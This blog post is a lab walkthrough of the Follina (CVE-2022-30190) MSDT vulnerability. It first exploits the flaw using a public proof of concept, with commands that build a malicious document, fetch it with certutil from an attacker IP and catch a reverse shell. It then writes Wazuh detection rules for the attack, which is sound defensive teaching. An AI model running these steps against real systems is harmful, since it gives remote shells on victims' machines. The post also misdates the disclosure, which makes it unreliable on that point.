---
title: "Exploiting & Detecting MSDT Follina Vulnerability"
description: "Exploiting Zero-Day MSDT Follina vulnerability and creating detection rules with Wazuh"
dateString: Jan 2023
draft: false
tags: ["Wazuh", "IDS", "Follina", "Exploit", "Incident Response"]
weight: 106
cover:
    image: "/blog/follina/follz.jpg"
---

# Introduction

As an Incident Responder, dealing with a zero day exploit in your IT environment is one of those things you would not wish on your worst enemy. First disclosed in May 2021, the Follina exploit is a remote code execution (RCE) vulnerability that affects Microsoft Diagnostic Tool (MSDT) and dubbed CVE-2022–30190. MSDT is a standard component in Windows Operating System and Follina can be exploited when MSDT is called using the URL protocol from an application like Microsoft Word. One of the reasons the exploit is devastating is because it affects all Microsoft Office versions and does not require macros to perform the attack. This is a massive advantage to adversaries and a nightmare for Blue teamers.

# How it works

An adversary creates a malicious MS Office document and delivers it the victim through phishing techniques i.e sending an email with a malicious document attached to it. This can be paired with some social engineering tactic to create a sense of urgency for the victim to open the email.

The malicious file contains a link to an HTML file which contains JavaScript code that executes malicious code in the command line via MSDT. In the event of a successful exploitation, the malicious actor can install programs, view, modify or delete data, or create new accounts etc.

To successfully demonstrate this exploit, I set up an environment with Kali Linux VM (attacker VM) and Windows 10/11 with Microsoft Office installed as the victim VM.

![](/blog/follina/setup.jpg)

# Steps to follow:

1. Download and install MS Office Suite on your victim machine from https://www.microsoft.com/en-us/download/confirmation.aspx?id=49117 . Extract the setup.exe and install it from command prompt using the command ```setup.exe /configure configuration-Office2021.xml```

![](/blog/follina/office.jpg)
![](/blog/follina/office2.jpg)

2. On the attack machine, download the follina POC from https://github.com/JohnHammond/msdt-follina and clone the repository to a folder named msdt-follina on the Desktop.

![](/blog/follina/attack1.jpg)


3. Run the command ```sudo python3 follina.py``` to create a payload follina.doc and serve it on port 8000. This will enable you to download the doc file on the victim machine.

![](/blog/follina/attack2.jpg)

4. On the victim machine, run the command ```certutil –urlcache –split –f http://192.168.11.85:8888/follina.doc``` to download the doc file onto the victim machine. Note that you should replace the IP (192.168.11.85) with your own attacker IP.

![](/blog/follina/certutil.jpg)

5. Once the file is downloaded on the victim machine, fire up the netcat listener on the attacking machine using the command ```sudo python3 follina.py –r 1337```. The listener will await connection on port 1337.

6. On the victim machine, open the document and this will spawn a shell on the attacking machine as shown below.

![](/blog/follina/shell.jpg)

# Detecting the attack on Wazuh

[Wazuh](https://wazuh.com/) is a free and open source security platform that unifies XDR and SIEM capabilities. It consists of security agents deployed to monitor endpoints and the central Server (Manager) that collects and analyzes data gathered by the agents.

To detect the attack, the victim machine has to meet the following requirements:

1. Wazuh Agent installed on the endpoint which pushes logs to the Wazuh Manager
2. Sysmon from Sysinternals Suite installed and active on the endpoint. It enables process-level logging on the host.
3. To set up a Wazuh Manager, follow the steps outlined [here](https://documentation.wazuh.com/current/quickstart.html).

# Understanding the Logs

Effective monitoring and detection are highly dependent on what the system logs present to an analyst. The logs to focus on in this particular attack will be process logs since we know that the attack is triggered by a Microsoft Office application spawning a new process. The goal is to create a rule that will accomplish two things:

1. Detect when a Microsoft application attempts to spawn a new process
2. Match any pattern in the command that relates to the exploitation of the follina vulnerability

The reason for creating such a two-part rule is to boost confidence in the detection and the alert level. This will also complement Wazuh’s ability to use a database of Common Vulnerabilities and Exposures (CVE) created automatically by processing data pulled from various sources.

Adding the following rules to the local Wazuh rule file on the Wazuh manager will flag any MS Office process creation activity as well MSDT execution.

```
<group name="follina, attack,">

  <rule id="110002" level="12">
    <if_sid>61603</if_sid>
    <field name="win.eventdata.parentImage">winword\.exe$|excel\.exe$|powerpnt\.exe$|outlook\.exe$|msaccess\.exe$|lync\.exe$|mspub\.exe$|onenote\.exe$</field>
    <description>Possible Follina (CVE-2022-30190) exploitation attempt detected. New process created by a Microsoft Office application.</description>
    <mitre>
      <id>T1203</id>
    </mitre>
  </rule>
  
  <rule id="110003" level="15">
    <if_sid>110002</if_sid>
    <field name="win.eventdata.originalFileName" type="pcre2">^msdt\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">ms-msdt:(/|-)id.*(PCWDiagnostic|IT_RebrowseForFile|IT_LaunchMethod|SelectProgram)</field>
    <description>Follina (CVE-2022-30190) exploitation attempt detected. MSDT executed with known Follina exploitation pattern.</description>
    <mitre>
      <id>T1203</id>
    </mitre>
  </rule>

</group>
```

The XML can be located at ```/var/ossec/etc/rules/local_rules.xml```

Save the file and restart Wazuh services with the command ```systemctl restart wazuh-manager```

![](/blog/follina/detection.jpg)

The effectiveness of the rule is confirmed by the above alert which gives the exact description of the vulnerability as well as the confidence level (15) as stipulated in the rule.

Further, the rule id on the alert shown below matches that of the custom rule we created earlier.

![](/blog/follina/rule.jpg)

# Conclusion
In summary, this article has explained how to exploit and detect CVE-2022–30190 aka Follina vulnerability which was made possible using a custom rule that would be triggered whenever a Microsoft Office application tries to spawn a new process.

Thanks for reading and happy learning 😀